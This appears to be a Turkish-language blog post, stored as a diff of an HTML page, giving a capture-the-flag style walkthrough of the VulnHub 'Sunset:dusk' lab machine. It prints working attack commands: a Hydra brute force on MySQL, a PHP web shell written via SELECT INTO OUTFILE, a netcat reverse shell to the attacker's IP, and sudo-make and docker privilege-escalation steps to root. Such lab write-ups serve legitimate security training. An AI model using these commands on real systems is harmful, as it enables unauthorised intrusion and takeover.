@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Sunset:dusk Makinesi</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Theme CSS -->
+    <link href="css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav style="background-color: black; opacity: 20%; margin-bottom: 10%;" class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Hüseyin Kavuncu</span>
+                    Menu <i class="fa fa-bars"></i>
+                </button>
+                <a class="navbar-brand" href="index.html">Kavuncu</a>
+            </div>
+
+            
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+               <ul class="nav navbar-nav navbar-right" style="padding-right: 11%;">
+                     <li>
+                        <a href="index.html">Home</a>
+                    </li>
+                    <li>
+                        <a href="about.html">About</a>
+                    </li>
+                </ul>
+            </div>
+           
+        </div>
+        
+    </nav>
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <div style="margin-bottom: 3%;"></div>
+    <header class="intro-header" style="background-image: url('img/sunset/topic.jpg'); height: 530px;">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Post Content -->
+    <article>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <h1 style="font-size: 45px;">Sunset:dusk Makinesi</h1>
+                    <h2 class="subheading" style="font-size: 26px;">Sunset:dusk makinesinin incelemesi.<br>Makine çözümü ve gerekli toollar ve bu toolların kullanımlarının incelemesi.</h2>
+
+                    <p>Merhabalar. Bu yazımda vulnhub sitesinde yayınlanan sunset:dusk makinesini inceleyip, çözümleyeceğim. Çözümlerken takip ettiğimiz teknik ve yöntemleri anlatmaya çalışacağım. Kullandığımız komutları açıklayacağım.</p>
+
+                    <p>Öncelikle sunset:dusk makinasını indiriyoruz. Bu bir hazır sanal makinadır yani .ova uzantısına sahiptir. Açtığımızda otomatik olarak VirtualBox için içeri aktar sekmesi ile karşılaşırız. Makinemizi içeri aktarıyoruz ve başlatmadan hemen önce saldırıyı gerçekleştireceğimiz bilgisayar ile aynı ağı kullandığından emin oluyoruz. Ben Köprü Bağdaştırıcısı ile bağlantı sağladım.</p>
+
+                    <p>Artık başlayabiliriz. İlk yapılması gereken şey her zaman ki gibi öncelikle hedef makineyi tespit etmek. Her zaman dediğim gibi nereye saldıracağımızı bilmemiz gerekiyor.</p>
+
+                    <img src="img/sunset/1.png" class="img-responsive" alt="">
+<br>
+                    <p style="display: inline;"><code style="display: inline;">ifconfig</code> komutu ile(ekranın sağ tarafı);</p>
+
+                    <p>Öncelikle kullandığımız makinanın IP adresini öğreniyoruz. Daha sonra bağlı olduğumuz ağda bulunan diğer makineleri tespit etmemiz gerekiyor. Bunun için</p>
+
+                    <p style="display: inline;"><code style="display: inline;">netdiscover</code> komutunu kullanıyoruz.(ekranın sol tarafı);</p>
+
+                    <p>Burada hedef makinamiza ait IP ve MAC adresini tespit ediyoruz. Artık hedefimizin kim olduğunu ve nasıl erişeceğimizi biliyoruz. Sırada hedef makineyi yakından tanımaya geldi. Port taraması yaparak portlar ve makine hakkında bilgi edinmeye çalışacağız ve bunun için elbette nmap'i kullanıyoruz.</p>
+
+                    <img src="img/sunset/2.png" class="img-responsive" alt="">
+<br>
+                    <p style="display: inline;"><code style="display: inline;">nmap -A 192.168.1.25 </code> komutu ile;</p>
+
+                    <p>Hedef makinada bir nmap taramasını gerçekleştiriyoruz ve yakından tanıma imkanımız oluyor. Öncelikle komutta kullandığımız -A parametresi agresif tarama parametresidir. Genel olarak zaafiyetli makinalara karşı kullanılan parametredir yani gerçek bir makine üzerinde çalıştığınızda göreceksiniz ki kullandığı bazı scriptler nmap taramasını ele verecek ve herhangi bir geri dönüş alamayacaksınız. Fakat şuan zaafiyetli bir makinede çalışıyoruz ve fotoğraftada göründüğü gibi bir çok bilgiyi bize vermektedir. Bu bilgileri değerlendirelim o zaman. Açık olan portlara baktığımızda makinenin bir web makinesi olduğunu görüyoruz. Karşımızda bir web makinesi varsa ilk olarak nikto abimize bir danışıyoruz.</p>
+
+                    <img src="img/sunset/3.png" class="img-responsive" alt="">
+<br>
+                    <p style="display: inline;"><code style="display: inline;">nikto -h 192.168.1.25 </code> komutu ile;</p>
+
+                    <p>nikto abimize soruyoruz. Beklediğimiz sonucu aldığımızı söyleyemem maalesef. Ama olsun XSS koruması olmadığını söyledi. Bir de siteye bakalım.</p>
+    
+                    <img src="img/sunset/4.png" class="img-responsive" alt="">
+
+                    <p>Buradan da pek bir çıkarım yapamadım maalesef. Birde portlarını kontrol ediyorum.</p>
+                    
+                    <img src="img/sunset/5.png" class="img-responsive" alt="">
+
+                    <p>Evet gördüğünüz gibi 8080 portunda bir şey yakaladık. Web sitesi /var/tmp uzantısında yer alıyor. Bu ne demek? Yani burada var olan web sayfaları yayınlanmaktadır. Buraya bir web sayfası koymayı başarabilirsek bunu bizde yayınlayabiliriz.</p>
+
+                    <img src="img/sunset/6.png" class="img-responsive" alt="">
+<br>
+                    <code style="display: inline;">hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.25 mysql </code>
+
+                    <p>Komutunu kullanarak MySQL'e BruteForce atıyoruz. Kolay bir şifresi ve parolası varmış. Metasploitable2 makinesine BruteForce saldırısı yaparken metasploit framework'ünü kullanmıştık. Burada metasploit framework'ünü kullanamaz mıydık? Tabii ki kullanabilirdik, metasploit framework'ünün içerisinde bir çok mysql modülü bulunmakta. Aslında hazır modüller ile belki doğrudan bağlantı da kurabilirdik. Lakin bizim niyetimiz burada balık yemek değil, balık tutmayı öğrenmek.</p>
+
+                    <img src="img/sunset/9.png" class="img-responsive" alt="">
+<br>
+                    <code style="display: inline;">mysql --host 192.168.1.25 -u root -p</code><p style="display: inline;"> komutu ile;</p>
+                    
+                    <p>MySQL bağlantısını gerçkeleştiriyoruz. Bizden bir de şifre istiyor ve şifreyi giriyoruz. SQL'in çok işe yarayan komutlarından birisini kullanmaya geldi sıra.</p>
+
+                    <img src="img/sunset/11.png" class="img-responsive" alt="">
+<br>
+                    <code style="display: inline;"> select <</code><code style="display: inline;margin-left: -5px;">?php system($_GET['cmd']); ?>" into outfile '/var/tmp/file.php';</code>
+
+                    <p>Komutu ile kendi sayfamısızı oluşturduk. Bu komutu biraz inceleyelim isterseniz. Öncelikle bu komut bir SQL sorgusudur ve bu sorguyu sondan incelemek biraz daha kolay olacak. En son kısımda tırnak içerisinde bir php web sayfasının uzantısını görüyoruz. Uzantıdan önce ise bir sql komutunu(into outfile) görüyoruz. Bu komut select komutu ile belirlediğimiz row(satır)'u dosyanın içerisine yazıyor. /var/tmp uzantısında file.php diye bir web sayfası yoktu. Yani oraya bir file.php sayfası oluşturup belirttiğimiz komutu oraya yazacak. Başta verdiğimiz php kodu ise bizim cmd ekranına erişimimizi sağlayacak olan komut. </p>
+
+                    <img src="img/sunset/12.png" class="img-responsive" alt="">
+
+                    <p>Evet şimdi file.php sayfamız oluşmuş. Bu sayfa üzerinden bağlantı kurmaya çalışacağız.</p>
+
+                    <img src="img/sunset/13.png" class="img-responsive" alt="">
+<hr>
+                    <code style="display: inline;">nc -lvp 4444</code><p style="display: inline;">Komutu ile;(ekranın sağ tarafı)</p>
+
+                    <p>İlk olarak kendi bilgisayarımızın 4444 portunu dinliyoruz. Ben 4444 portunu seçtim siz farklı bir port kullanabilirsiniz. Aktif bir servisin çalıştığı bir portu kullanmamaya dikkat edin ama.</p>
+
+                    <code style="display: inline;">192.168.1.25:8080/file.php?cmd=nc -e /bin/bash 192.168.1.26 4444</code>
+
+                    <p>Bu komutu tarayıcımıza yazıyoruz. Yazdığımız bu komut file.php dosyasına yazdığımız SQL sorgusana girecek ve bize bir NetCat bağlantısı kuracak. Bu arada NetCat portlarda TCP/UDP dinleme ve yazma işlemi yapan bir hizmettir. Bu sayede www-data kullanıcısı olarak giriş yapmayı başardık.</p>
+
+                    <img src="img/sunset/13.png" class="img-responsive" alt="">
+<hr>
+                    <code style="display: inline;">python3 -c 'import pty;pty.spawn("/bin/bash")'</code><p style="display: inline;"> Komutu ile;</p>
+
+                    <p>Shell'e geçiş yapıyoruz. Bu komut bir python ve python3 komutu, yani python3 yerine python yazarsanız da çalışacaktır. pty kütüphanesinin spawn methodu sayesinde istenilen uzantıya ulaşmamızı sağlıyor. Spawn kelime anlamı olarakta meydane gelmek, ortaya çıkmak gibi bir anlamı var. Oyunlarda birden spawnlandı falan denir. Aklınıza oradan da gelebilir.</p>
+
+                    <img src="img/sunset/13.png" class="img-responsive" alt="">
+<hr>
+                    <code style="display: inline;">sudo -l</code><p style="display: inline;"> Komutu ile;</p>
+
+                    <p>Dosya uzantılarında ki yetkilendirmeyi kontrol edebiliyoruz ve gördüğünüz gibi /usr/bin/ uzantısına parolasız erişimimiz var.</p>
+                    
+                    <code style="display: inline;">shell=/bin/sh</code><p style="display: inline;"> Komutu ile;</p>
+
+                    <p>Parolasız geçiş yapabildiğimiz bu uzantıda shell açıyoruz. Ama bu da yeterli değil.</p>
+
+                    <code style="display: inline;">sudo -u dusk make -s --eval=$'x:\n\t-'"$shell"</code><p style="display: inline;"> Komutu ile;</p>
+
+                    <p>Dusk kullanıcısına ve interactive shell'e geçiş yapıyoruz. Böylece docker'ı root yetkisi ile çalıştırabileceğiz.</p>
+
+                    <code style="display: inline;">docker run -it -v /root:/root ubuntu</code><p style="display: inline;"> Komutu ile;</p>
+
+                    <p>docker'ı root yetkisi ile çalıştırıyoruz ve böylece root yetkisini de elimize almış oluyoruz.</p>
+
+
+
+
+                    <a href="index.html">
+                        <span style="color: black; opacity: 50%; padding-left: 38%;" class="meta">Posted by <a href="index.html">Hüseyin KAVUNCU</a> on April 6, 2020</span>
+                    </a>
+
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="https://www.instagram.com/kavuncu_azade_">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-instagram fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://www.linkedin.com/in/h%C3%BCseyin-kavuncu-664485177">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://github.com/esasadam06">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="mailto:hsynkavuncu.6@gmail.com">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+               
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="vendor/jquery/jquery.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- Contact Form JavaScript -->
+    <script src="js/jqBootstrapValidation.js"></script>
+    <script src="js/contact_me.js"></script>
+
+    <!-- Theme JavaScript -->
+    <script src="js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
